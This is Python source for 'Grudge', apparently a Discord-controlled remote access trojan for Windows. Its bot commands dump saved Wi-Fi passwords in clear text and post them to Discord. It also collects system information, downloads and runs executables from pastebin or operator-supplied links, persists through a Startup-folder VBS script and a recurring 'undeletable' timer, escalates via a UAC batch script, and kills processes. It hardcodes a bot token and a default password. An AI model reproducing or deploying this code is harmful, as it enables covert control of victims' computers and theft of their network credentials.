#Discord        : Grudge#4212
#Discord Server : http://discord.gg/AEwjehFG
#--------------------------#
#         Grudge 1.0       #
#--------------------------#
#-----------Module---------#
import discord
from discord.ext import commands
from discord.ui import Button, View
from platform import uname
from psutil import cpu_times_percent,virtual_memory,disk_usage
import os
import sys
import ctypes
from requests import get,head,ConnectionError
from time import sleep
from threading import Timer
from shutil import move
from subprocess import Popen, check_output, CalledProcessError
from urllib.request import urlretrieve
from wakepy import set_keepawake, unset_keepawake
from pyuac import isUserAdmin,runAsAdmin
from retry import retry
#-----------------------------BUTTON------------------------------#
"""    
Button = Button(label='Download', style=discord.ButtonStyle.green) #button
view = View()
view.add_item(Button)
await ctx.send(view=view)

async def button_callback(interaction):
Button.callback = button_callback"""
#-----------------------------Local Disk-------------------------#
user=os.path.expanduser('~') #C:\Users\kevin
local_disk=user[:2]          #C:
#__file__ =  C:\Users\kevin\Desktop\test.py 
#---------------------------Online Data-------------------------#
na='{}.exe'.format(str(os.path.basename(__file__))).replace('.py','')
na2 = na.replace('.exe','')
#----------------------------settings----------------------------#
Admin_Privilege = False    #Administrator ON=True,OFF=False
#-----------------------------App_DATA---------------------------#
current = 1.0
App_Name = '{}'.format(str(na)); name = '{}'.format(str(na2)); Old_App_Name = App_Name                 
Main_Location = (__file__).split('_MEI',1)[0]      #'{}\\'.format(os.getcwd())

default_password = 'Grudge16903584'
adminKey = ''  #Leave it
Link = ''      #Recovery Link
#---------------------------ADDITIONAL data-----------------------#
GrudgeLink= 'https://pastebin.com/raw/pgjhv1L6'          #Grudge
VersionLink = 'https://pastebin.com/raw/zCukbjmH' #version 
InfoLink = 'https://pastebin.com/raw/zLurRsnv'   #ver info
KeyLink = 'https://pastebin.com/raw/3ywifLXS'
#-----------------------------System-------------------------------#
if Admin_Privilege == True:
    if not isUserAdmin():
        #runAsAdmin()
        ctypes.windll.shell32.ShellExecuteW(None, 'runas',sys.executable,"".join(sys.argv[1:]), None, 1)
App_Location = '{}{}'.format(Main_Location, App_Name)
Password_File = '{}mib.txt'.format(Main_Location) 
Bootstat = '{}bootstat.txt'.format(Main_Location) #Undeletable ON/OFF
oldGrudge = '{}$77Broken.exe'.format(Main_Location)
update = False             
info = ''            #Blank
version = ''         #Blank
#-------------------------------Check----------------------------#
passwrd = os.path.exists('{}'.format(Password_File))
Old_Grudge = os.path.exists('{}'.format(oldGrudge))
#@retry(delay=2)
def remove(loc):
    os.remove('{}'.format(loc))
    os.popen('del "{}"'.format(loc))
if Old_Grudge == True:    #It will check if there's an old version of Grudge, it will be deleted
    remove(oldGrudge)
if passwrd==False:
    with open('{}'.format(Password_File),'w') as file:
        file.write('{}'.format(default_password))
        file.close()
    

#-------------------------------VARIABLES------------------------#
#user=os.path.expanduser('~'); local_disk=user[:2]
#output : c:
#user_folder='{}{}{}{}{}'.format(user[:3],user[2:3],user[3:9],user[8:9],user[9:])
#output : c:\\kevin
menu_list = '''              
Welcome To Grudge          
--------------------
1-Actions                                 
2-App Installer            
3-Device Information  
4-Settings                  
'''
alist = '''
Actions
--------
1-Turn OFF
2-Keep screen awake
3-Wifi

-----------------------------
WELCOME TO GRUDGE 1.1
-----------------------------
'''
blist = '''
App Installer
-------------
1-Automatically
2-Manually
'''
dlist = '''
Settings
--------
1-Uninstall Grudge       
2-Undeletable (ON/OFF)  
3-Change password
4-Grudge Protection'''
cautious = '''
Caution: performing this action will delete
-------------------------------------------- 
your Grudge permanently!
----------------------------
Are you sure?
'''
#psd=open('{}'.format(Password_File),'r')
#password = psd.read()
#-----------------------------Interval---------------------------#
'''cd %USERPROFILE%
cd..
cd..
cd Windows'''
#----------------------------------------------------------------#
@retry(delay=2)
def rename(old,new):
    os.rename(old,new)
#----------------------------------------------------------------#
def read(file):
    with open(file, 'rb') as jpg:
        content=jpg.read()
        offset = content.index(b'\xff\xd9')
        data = content[offset + 2:].decode()
        #print(data)
        return data
#----------------------------------------------------------------#
def check_pass():
    global xpass
    mib = os.path.exists('{}'.format(Password_File))
    if mib !=True:
        with open("{}".format(Password_File),'w') as file:
            file.write('{}'.format(default_password))
            file.close()
        xpass = 'False'
        return xpass
    if mib == True:
        xpass = 'True'
        return xpass
    else:
        xpass = 'Error'   #raise an error to get user's attention!
        return xpass
    return xpass
#----------------------------------------------------------------#
'''def Grudge_Protection(process_name):
    Timer(5.0, Grudge_Protection).start()
    GP = os.path.exists('{}\\Windows\\sys\\prot.txt'.format(local_disk))
    if GP == True:
        protection = open('{}\\Windows\\sys\\prot.txt'.format(local_disk),'r').read()
        if protection=='True':
            call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
            output = check_output(call).decode()
            last_line = output.strip().split('\r\n')[-1]
            sleep(0.5)
            alert('You need administrator privileges to complete this task. Close Task Manager, then run it as an administrator and try again.','Unable to terminate process')
            return last_line.lower().startswith(process_name.lower())
        else:
            pass
    else:
        pass'''
#----------------------------------------------------------------#
def download(url,filename):
    urlretrieve(url, '{}{}'.format(Main_Location ,filename)) #Main_Location
    #file=get('{}'.format(newlink));open('{}{}'.format(Main_Location ,filename),'wb').write(file.content)
#----------------------------------------------------------------#
def read_site(url):
    new_link = get('{}'.format(GrudgeLink)).text
    global newlink
    newlink = new_link
#----------------------------------------------------------------#
def update_app_name():
    Timer(5.0, update_app_name).start()
    na='{}.exe'.format(str(os.path.basename(__file__))).replace('.py','')
    na2 = na.replace('.exe','')
    global App_Name,name
    App_Name = '{}'.format(str(na))
    name = '{}'.format(str(na2)) 
def check_for_news():
    version1 = get('{}'.format(VersionLink)).text
    global version
    version = version1.replace('\n','')
    global update
    if float(version) > current :
        print('New Update Has Been Released!')
        global info
        info = get('{}'.format(InfoLink)).text
        update = True
    else:
        print('Nothing New')
        update = False
#----------------------------------------------------------------#    
def check_for_updates():
    Timer(1800.0, undeletable).start()
    print('checking for update')
    version1 = get('{}'.format(VersionLink)).text
    global version
    version = version1.replace('\n','')
    global update
    if float(version) > current :
        print('New Update Has Been Released!')
        global info
        info = get('{}'.format(InfoLink)).text
        update = True
    else:
        print('Nothing New')
        update = False
#----------------------------------------------------------------#
def update_adminKey():
    Timer(5.0, update_adminKey).start()
    global adminKey
    adminKey = get('{}'.format(KeyLink)).text
#----------------------------------------------------------------#
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
#----------------------------------------------------------------#
def find(path, name):
    for root, dirs, files in os.walk(path):
        if name in files:
            global result
            result = os.path.join(root, name)
#----------------------------------------------------------------#
def undeletable():
    Timer(600.0, undeletable).start()
    user=os.path.expanduser('~')
    local_disk=user[:2]
    bootstat = os.path.exists('{}'.format(Bootstat))
    #------------------------------------New Line--------------------------------------#
    if bootstat == True:
        file=open('{}'.format(Bootstat),'r'); File=file.read()
        #------------------------------------New Line--------------------------------------#
        if File == 'True':
            user=os.path.expanduser('~')
            user_folder='{}{}{}{}{}'.format(user[:3],user[2:3],user[3:9],user[8:9],user[9:])
            #Grudge.exe
            Grudge=os.path.exists('{}{}'.format(App_Location, App_Name))
            #VBScript
            vbs=os.path.exists('{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}.vbs'.format(user_folder,vbs_name))
            #------------------------------------New Line--------------------------------------#
            if Grudge!=True:        #Grudge.exe
                print("{} doesn't exist, Working on it..".format(App_name))
                download(Link, '{}'.format(App_Name))     #incomplete PLease insert a link for recovery
            #------------------------------------New Line--------------------------------------#
            if vbs!=True:           #VBScript
                location = '{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(user_folder)
                with open('{}\\{}.vbs'.format(location,vbs_name), 'w') as file: #Writeing in it
                    file.write('{}'.format(VBScript))
                    file.close()
            #------------------------------------New Line--------------------------------------#
        elif File == 'False':
            pass
        else:
            pass
#---Activate---#
#undeletable()
#update_loc()
#update_adminKey()
#check_for_updates()
#TaskManager=Grudge_Protection('Taskmgr.exe')
#-------------------------------BASIC----------------------------#
#                                                                #
bot= commands.Bot(command_prefix="@", intents=discord.Intents.all(), guilds=True)

#-------------------------------SCRIPT---------------------------#
@bot.event
async def on_ready():
    #print('bot connected')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="La Casa De Papel"))

@bot.command()
async def menu(ctx):
    await ctx.send(menu_list)
    if update==True:
        Download_button = Button(label='Update!', style=discord.ButtonStyle.green) #button
        view = View()
        view.add_item(Download_button)
        await ctx.send(view=view)

        async def button_callback(interaction):
            global info
            await ctx.send('{}'.format(info))
            Download_button = Button(label='Download', style=discord.ButtonStyle.green) #button
            view = View()
            view.add_item(Download_button)
            await ctx.send(view=view)
            async def button_callback(interaction):
                Downmsg = await ctx.send('Downloading..')
                read_site('{}'.format(GrudgeLink))
                download('{}'.format(newlink),'Grudge2.exe')
                sleep(1)
                Grudge=os.path.exists('{}Grudge2.exe'.format(Main_Location))
                sleep(0.5)
                if Grudge!=True:
                    download('{}'.format(newlink),'Grudge2.exe')
                elif Grudge==True:
                    uninstall = resource_path('Uninstall.exe'); os.popen('{}'.format(uninstall))
                    global App_Name
                    old = os.path.join('{}'.format(Main_Location), '{}'.format(App_Name))
                    new = os.path.join('{}'.format(Main_Location), '$77Broken.exe')
                    os.rename(old,new)
                    old = os.path.join('{}Grudge2.exe'.format(Main_Location))#, 'Grudge2.exe')
                    new = os.path.join('{}{}.exe'.format(Main_Location,name))#, '{}.exe'.format(name))
                    sleep(0.3)
                    rename(old,new)
                    await Downmsg.edit(content="Updated successfully")
                    await ctx.send("---------------------")
                    global update
                    update = False
                    os.popen('{}{}'.format(Main_Location,App_Name))
                    await ctx.send('''-------------------------
  Welcome To Grudge {}
-------------------------
'''.format(float(version)))
                    os.popen('schtasks /run /TN "{}"'.format(Old_App_Name))
                    sleep(0.8)
                    install = resource_path('install.exe'); os.popen('{}'.format(install))
                    os.popen('taskkill /f /im {}'.format(App_Name))
                    await bot.close()
                    os.popen('taskkill /f /im {}'.format(App_Name))
                    sys.exit()
                    exit()
                    quit()
            Download_button.callback = button_callback
        Download_button.callback = button_callback

        
        
    msg = await bot.wait_for("message")
    if msg.content == '1':
        await ctx.send('{}'.format(alist))
        sleep(0.2)
        msg = await bot.wait_for("message")
        if msg.content == '1':
            await ctx.send('''1-ctx.bot.logout
2-bot.close
''')
            sleep(0.2)
            msg = await bot.wait_for("message")
            if msg.content =='1':
                pass
            elif msg.content =='2':
                #await bot.close()
                sys.exit()
            else:
                pass
        elif msg.content == '2':
            ON = Button(label='ON', style=discord.ButtonStyle.green) #button
            view = View()
            view.add_item(ON)
            await ctx.send(view=view)

            async def button_callback(interaction):
                set_keepawake(keep_screen_awake=True)
                await ctx.send('Turned ON')
            ON.callback = button_callback
            OFF = Button(label='OFF', style=discord.ButtonStyle.green) #button
            view = View()
            view.add_item(OFF)
            await ctx.send(view=view)

            async def button_callback(interaction):
                unset_keepawake()
                await ctx.send('Turned OFF')
            OFF.callback = button_callback
        elif msg.content == '3':
            wifi = '''Wifi   |   password\n---------------------\n'''
            msg = await ctx.send('{}'.format(wifi))
            shell=os.popen('netsh wlan show profiles').read()
            for line in shell.splitlines():
                if ': ' in line:
                    variable, value = line.split(': ')
                    shell=os.popen('netsh wlan show profile "{}" key=clear'.format(value)).read()
                    for line in shell.splitlines():
                        if 'Key Content' in line:
                            variable2, value2 = line.split(': ')
                            wifi+=('{} | {} \n'.format(value,value2))
            await msg.edit(content='{}'.format(wifi))
    elif msg.content == '2':
        await ctx.send('{}'.format(blist))
        sleep(0.5)
        msg = await bot.wait_for("message")
        if msg.content == '1':
            msg = await ctx.send('Checking For Updates|')
            for i in range(0,2):
                await msg.edit(content='Checking For Updates /')
                sleep(1)
                await msg.edit(content='Checking For Updates ―')
                sleep(1)
                await msg.edit(content='Checking For Updates \\')
                sleep(1)
                await msg.edit(content='Checking For Updates /')
                sleep(1)
                await msg.edit(content='Checking For Updates ―')
                sleep(1)
                await msg.edit(content='Checking For Updates \\')
            check_for_news()
            sleep(0.5)
            if update==True:
                global info
                await msg.edit(content='{}'.format(info))
                Download_button = Button(label='Download', style=discord.ButtonStyle.green) #button
                view = View()
                view.add_item(Download_button)
                await ctx.send(view=view)

                async def button_callback(interaction):
                    msg = await ctx.send('Downloading some files \n|█          |')
                    animation='█'
                    space='         '
                    number=9
                    for i in range(0,10):
                        await msg.edit(content='Downloading some files \n|{}{}|'.format(animation,space))
                        animation = animation+'█'
                        number=number-1
                        space=space[0:number]
                        sleep(1)
                    await ctx.send('Now Wait..')
                    read_site(GrudgeLink)
                    Grudge_link = newlink
                    sleep(0.3)
                    download('{}'.format(Grudge_link),'Grudge2.exe')
                    sleep(1)
                    Grudge=os.path.exists('{}Grudge2.exe'.format(Main_Location))
                    sleep(0.5)
                    if Grudge!=True:
                        download('{}'.format(Grudge_link),'Grudge2.exe')
                    elif Grudge==True:
                        uninstall = resource_path('Uninstall.exe'); os.popen('{}'.format(uninstall))
                        global App_Name
                        old = os.path.join('{}'.format(Main_Location), '{}'.format(App_Name))
                        new = os.path.join('{}'.format(Main_Location), '$77Broken.exe')
                        os.rename(old,new)
                        old = os.path.join('{}'.format(Main_Location), 'Grudge2.exe')
                        new = os.path.join('{}'.format(Main_Location), '{}.exe'.format(name))
                        sleep(0.8)
                        os.rename(old,new)
                        await ctx.send("Updated successfully")
                        await ctx.send("---------------------")
                        global update
                        update = False
                        os.popen('{}{}'.format(Main_Location,App_Name))
                        await ctx.send('''-------------------------
  Welcome To Grudge {}
-------------------------
'''.format(float(version)))
                        os.popen('schtasks /run /TN "{}"'.format(Old_App_Name))
                        sleep(0.8)
                        install = resource_path('install.exe'); os.popen('{}'.format(install))
                        await bot.close()
                        sys.exit()
                        exit()
                        quit()
                Download_button.callback = button_callback
            else:
                await msg.edit(content='Your Grudge is up to date :)')

                
        elif msg.content =='2':
            mail = await ctx.send('Send App Link :  Countdown(5)')
            sleep(0.5)
            x=5
            for i in range(0,6):
                await mail.edit(content='Send App Link :  Countdown({})'.format(x))
                sleep(1)
                x=x-1
            msg = await bot.wait_for('message')
            link1=msg.content
            if link1[0:5] == 'https':
                await ctx.send('installing Grudge')
                download('{}'.format(link1), 'Grudge2.exe')
                mail = await ctx.send("Send the next link after the countdown times up")
                Continue=True
                if Continue==True:
                    sleep(4)
                    await mail.edit(content='Send Info Link :  Countdown(10)')
                    x=10
                    for i in range(0,11):
                        await mail.edit(content='Send Info Link :  Countdown({})'.format(x))
                        sleep(1)
                        x=x-1
                    await mail.edit(content='Send Info Link :  Countdown()')
                    msg3 = await bot.wait_for('message')
                    link3 = msg3.content
                    if link3[0:5] == 'https':
                        #await ctx.send('installing info')
                        download('{}'.format(link3), 'info.txt')
                    if Continue==True:
                        Grudge=os.path.exists('{}Grudge2.exe'.format(Main_Location))
                        info=os.path.exists('{}info.txt'.format(Main_Location))
                        sleep(0.5)
                        if Grudge!=True:
                            download('{}'.format(link1), 'Grudge2.exe')
                        if info!=True:
                            download('{}'.format(link3), 'info.txt')
                        #copy('Grudge2.exe', '{}\\Windows\\sys\\'.format(local_disk))
                        #copy('name.txt', '{}\\Windows\\sys\\'.format(local_disk))
                        #copy('$77info.txt', '{}\\Windows\\sys\\'.format(local_disk))
                        inf = open('{}info.txt'.format(Main_Location), 'r')
                        info= inf.read(); inf.close()
                        msg = await ctx.send('Now Wait..')
                        sleep(0.5)
                        await msg.edit(content='{}'.format(info))
                        if Continue==True:
                            Download_button = Button(label='Download', style=discord.ButtonStyle.green) #button
                            view = View()
                            view.add_item(Download_button)
                            await ctx.send(view=view)
                            async def button_callback(interaction):
                                #os.remove('{}'.format(App_Name))
                                os.remove('{}info.txt'.format(Main_Location))
                                uninstall = resource_path('Uninstall.exe'); os.popen('{}'.format(uninstall))
                                global App_Name
                                old = os.path.join('{}'.format(Main_Location), '{}'.format(App_Name))
                                new = os.path.join('{}'.format(Main_Location), '$77Broken.exe')
                                os.rename(old,new)
                                old = os.path.join('{}'.format(Main_Location), 'Grudge2.exe')
                                new = os.path.join('{}'.format(Main_Location), '{}'.format(App_Name))
                                sleep(0.5)
                                os.rename(old,new)
                                await ctx.send("Updated successfully")
                                await ctx.send("---------------------")
                                global update
                                update = False
                                os.popen('{}{}'.format(Main_Location,App_Name))
                                await ctx.send('''-------------------------
  Welcome To Grudge {}
-------------------------
'''.format(float(version)))
                                os.popen('schtasks /run /TN "{}"'.format(Old_App_Name))
                                sleep(0.8)
                                install = resource_path('install.exe'); os.popen('{}'.format(install))
                                os.popen('taskkill /f /im {}'.format(Old_App_Name))
                                await bot.close()
                                sys.exit()
                                exit()
                                quit()
                            Download_button.callback = button_callback 
                        else:
                            pass
                    else:
                        await ctx.send('Wrong link')
                        return
                
                else:
                    await ctx.send('Wrong link')
                    return

            else:
                await ctx.send('Wrong link')
                return


    elif msg.content == '3':
        msg=await ctx.send('Please Wait...')
        my_system = uname()
        hdd = disk_usage('/')
        global Report
        Report = '''System    : {}
Node Name : {}
Release   : {}
Version   : {}
Machine   : {}
Processor : {}
CPU Usage : {}
RAM Memory Used % : {}
RAM Used (GB)     : {}
Total     : {}
Used      : {}
Free      : {}
            '''.format(my_system.system,my_system.node,my_system.release,my_system.version
                       ,my_system.machine,my_system.processor,
                       cpu_times_percent(4),virtual_memory()[2],
                       virtual_memory()[3]/1000000000,"%d GiB" % (hdd.total // (2**30)),
                       "%d GiB"  % (hdd.used // (2**30)),"%d GiB" % (hdd.free // (2**30)))
        sleep(10)
        await msg.edit(content='''Device Information Report''')
        await ctx.send('''----------------------------''')
        sleep(0.5)
        await ctx.send('{}'.format(Report))
        sleep(0.5)
        await ctx.send('---------------------------')
        Download_button = Button(label='Download PDF', style=discord.ButtonStyle.red) #button
        view = View()
        view.add_item(Download_button)
        await ctx.send(view=view)
        async def button_callback(interaction):
            with open("{}Report.txt".format(Main_Location),"w") as file:
                global Report
                file.write('{}'.format(Report))
                file.close()
                sleep(2)
            loc = "{}Report.txt".format(Main_Location)
            await interaction.response.send_message(file=discord.File(r'{}'.format(loc)))
            os.remove('{}'.format(loc))
            Report = None
        Download_button.callback = button_callback
    elif msg.content == '4':
        await ctx.send('{}'.format(dlist))
        sleep(0.5)
        msg = await bot.wait_for('message')
        if msg.content == '1':
            await ctx.send('{}'.format(cautious))
            yes_button = Button(label='Continue', style=discord.ButtonStyle.success) #button
            view = View()
            view.add_item(yes_button)
            await ctx.send(view=view)

            async def button_callback(interaction):
                global password
                mail = await ctx.send('Enter The Password : (Send after the countdown times up!)')
                sleep(4)
                x=10
                for i in range(0,11):
                    await mail.edit(content='Enter The Password :  Countdown({})'.format(x))
                    sleep(1)
                    x=x-1
                await mail.edit(content='Enter The Password :  Countdown()')
                msg = await bot.wait_for('message')
                check_pass()
                if xpass == 'True':
                    pass
                elif xpass == 'False':
                    await ctx.send('Password has been Reset!. This happens due to user has deleted password file')
                    await ctx.send('To solve this problem ask the admin for a new advanced Grudge with different location.. Or send him this code(101)')
                    await ctx.send('For now, Your password is : {} '.format(default_password))
                elif xpass == 'Error':
                    await ctx.send('Error with reading password file.. please send this code to the admin to fix(102)')
                    await ctx.send('For now Enter a temporary password : ')
                    sleep(1)
                    key = await bot.wait_for('message')
                    password = key.content
                    return password
                if (msg.content) == password:
                    await ctx.send('Removing Grudge From The Device..')
                    sleep(2)
                    await ctx.send('Downloading  (580 kB)')
                    msg221 = await ctx.send('Downloading some files \n|█          | 32 kB 120 kB/s')
                    for i in range(1,2):
                        await msg221.edit(content='Downloading some files \n|██         | 60 kB 240 kB/s')
                        sleep(1)
                        await msg221.edit(content='Downloading some files \n|███        | 78 kB 560 kB/s')
                        sleep(1)
                        await msg221.edit(content='Downloading some files \n|████       | 122 kB 320 kB/s')
                        sleep(1)
                        await msg221.edit(content='Downloading some files \n|█████      | 149 kB 300 kB/s')
                        sleep(1)
                        await msg221.edit(content='Downloading some files \n|██████     | 170 kB 580 kB/s')
                        sleep(1)
                        await msg221.edit(content='Downloading some files \n|███████    | 230 kB 679 kB/s')
                        sleep(1)
                        await msg221.edit(content='Downloading some files \n|████████   | 310 kB 730 kB/s')
                        sleep(1)
                        await msg221.edit(content='Downloading some files \n|█████████  | 394 kB 560 kB/s')
                        sleep(1)
                        await msg221.edit(content='Downloading some files \n|██████████ | 459 kB 475 kB/s')
                        sleep(1)
                        await msg221.edit(content='Downloading some files \n|███████████| 580 kB 930 kB/s')
                    msg222 = await ctx.send('Launching the file.')
                    for i in range(1,3):
                        sleep(1)
                        await msg222.edit(content='Launching the file..')
                        sleep(1)
                        await msg222.edit(content='Launching the file...')
                        sleep(1)
                        await msg222.edit(content='Launching the file.')
                    await msg222.edit(content='Deleted Successfully!')
                    
                    msg = await ctx.send('the server will shutdown in (3)')
                    count = 3
                    for i in range(0,4):
                        await msg.edit(content='the server will shutdown in ({})'.format(count))
                        sleep(1)
                        count = count-1
                    loc = '{}delete.bat'.format(Main_Location)
                    uninstall = resource_path('Uninstall.exe')
                    os.popen('{}'.format(uninstall))
                    sleep(5)
                    with open('{}'.format(loc),'w') as file:
                        file.write('''
@echo off
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    
rem    <YOUR BATCH SCRIPT HERE>
rem timeout /T 2 /NOBREAK
taskkill /f /im {}
cd {}
del {}
del '{}'
del run.vbs
del delete.bat
'''.format(App_Name,Main_Location, App_Name,__file__))
                        file.close()
                    loc2 = '{}run.vbs'.format(Main_Location)
                    with open('{}'.format(loc2),'w') as file:
                        file.write('''CreateObject("Wscript.Shell").Run "{}", 0 , False'''.format(loc))
                        file.close()
                    sleep(2)
                    os.popen('{}'.format(loc))
                else:
                    await ctx.send('wrong password!')
            
            yes_button.callback = button_callback
            no_button = Button(label='Cancel', style=discord.ButtonStyle.danger) #button
            view = View()
            view.add_item(no_button)
            await ctx.send(view=view)

            async def button_callback(interaction):
                pass
            no_button.callback = button_callback
        elif msg.content == '2':
            Turn_ON = Button(label='Turn ON ', style=discord.ButtonStyle.green) #button
            view = View()
            view.add_item(Turn_ON)
            await ctx.send(view=view)

            async def button_callback(interaction):
                file = os.path.exists('{}'.format(Bootstat))
                if file == True:
                    file=open('{}'.format(Bootstat),'r');File=file.read()
                    if File!='True':
                        file=open('{}'.format(Bootstat),'w')
                        file.write('True')
                        file.close()
                    elif File=='True':
                        pass
                elif file!=True:
                    with open('{}'.format(Bootstat),'w') as file:
                        file.write('True')
                        file.close()
                await ctx.send('Turned ON')
            Turn_ON.callback = button_callback
            Turn_OFF = Button(label='Turn OFF', style=discord.ButtonStyle.danger) #button
            view = View()
            view.add_item(Turn_OFF)
            await ctx.send(view=view)

            async def button_callback(interaction):
                user=os.path.expanduser('~')
                local_disk=user[:2]
                file = os.path.exists('{}'.format(Bootstat))
                if file == True:
                    file=open('{}'.format(Bootstat),'r');File=file.read()
                    if File!='False':
                        file=open('{}'.format(Bootstat),'w')
                        file.write('False')
                        file.close()
                    elif File=='False':
                        pass
                elif file!=True:
                    with open('{}'.format(Bootstat),'w') as file:
                        file.write('False')
                        file.close()
                await ctx.send('Turned OFF')
            Turn_OFF.callback = button_callback
        elif msg.content == '3':
            global password
            mail = await ctx.send('Enter Old Password : (send after countdown times up)')
            sleep(4)
            x=6
            for i in range(0,7):
                    await mail.edit(content='Enter Old Password :  Countdown({})'.format(x))
                    sleep(1)
                    x=x-1
            await mail.edit(content='Enter Old Password :  Countdown(0)')
            msg = await bot.wait_for('message')
            check_pass()
            #------------------------------------------------------------------------------#
            if xpass == 'True':
                pass
            elif xpass == 'False':
                await ctx.send('Password has been Reset!. This happens due to user has deleted password file')
                await ctx.send('To solve this problem ask the admin for a new advanced Grudge with different location.. Or send him this code(101)')
                await ctx.send('For now, Your password is : {} '.format(default_password))
            elif xpass == 'Error':
                global password
                await ctx.send('Error with reading password file.. please send this code to the admin to fix(102)')
                await ctx.send('For now Enter a temporary password : ')
                sleep(1)
                key = await bot.wait_for('message')
                password = key.content
                return password
            #------------------------------------------------------------------------------#
            if msg.content == password:
                mail = await ctx.send("Send password after the countdown times up!")
                sleep(4)
                await mail.edit(content='Enter A New Password :  Countdown(5)')
                x=5
                for i in range(0,6):
                    await mail.edit(content='Enter A New Password :  Countdown({})'.format(x))
                    sleep(1)
                    x=x-1
                await mail.edit(content='Enter A New Password :  Countdown()')
                msg = await bot.wait_for('message')
                mail = await ctx.send("Send password after the countdown times up!")
                sleep(4)
                mail = await ctx.send('Enter Admin permission Code Key :  Countdown(5)')
                x=5
                for i in range(0,6):
                    await mail.edit(content='Enter Admin permission Code Key :  Countdown({})'.format(x))
                    sleep(1)
                    x=x-1
                await mail.edit(content='Enter Admin permission Code Key :  Countdown()')
                admin_key = await bot.wait_for('message')
                sleep(0.3)
                if admin_key.content==adminKey:
                    password = msg.content
                    file=open('{}'.format(Password_File),'w')
                    file.write('{}'.format(msg.content))
                    file.close()
                    await ctx.send('Changed successfully!')
                else:
                    await ctx.send('Wrong Key [4092]')
            else:
                await ctx.send('Wrong Password!')

        elif msg.content == '4':
            activate = Button(label='Activate⛊', style=discord.ButtonStyle.green) #button
            view = View()
            view.add_item(activate)
            await ctx.send(view=view)

            async def button_callback(interaction):
                GP = os.path.exists('{}prot.txt'.format(Main_Location))
                if GP ==True:
                    with open('{}prot.txt'.format(Main_Location),'w') as file:
                        file.write('True')
                        file.close()
                    await ctx.send('Activated⛊')
                if GP !=True:
                    with open('{}prot.txt'.format(Main_Location),'w') as file:
                        file.write('True')
                        file.close()
                    await ctx.send('Activated⛊')
            activate.callback = button_callback
            #----------------------------------#
            Shut_down = Button(label='Disactivate', style=discord.ButtonStyle.green) #button
            view = View()
            view.add_item(Shut_down)
            await ctx.send(view=view)

            async def button_callback(interaction):
                GP = os.path.exists('{}prot.txt'.format(Main_Location))
                if GP ==True:
                    with open('{}prot.txt'.format(Main_Location),'w') as file:
                        file.write('False')
                        file.close()
                    await ctx.send('Turned OFF')
                if GP !=True:
                    with open('{}prot.txt'.format(Main_Location),'w') as file:
                        file.write('False')
                        file.close()
                    await ctx.send('Turned OFF')
            Shut_down.callback = button_callback
            
            
               
            
                
                    




#---------------------------------------------#
timeout = 1
while True:
    #install = resource_path('install.exe'); os.popen('{}'.format(install))
    sleep(10)
    try:
        head("http://facebook.com", timeout=timeout)
        print('working, testing the connection again..')
        sleep(10)
        head("http://facebook.com", timeout=timeout)
        print('worked')
        break
    #------------------------------#
    except ConnectionError:
        print('no connection')
#-----------------------------------------------------------#
bot.run('MTA5NTcwNjAyOTAwMzY1NzI5Nw.GYFMEo.VZaSdlaJXjreI1em4SOHwEebgSVnXeXfEyLpxo')
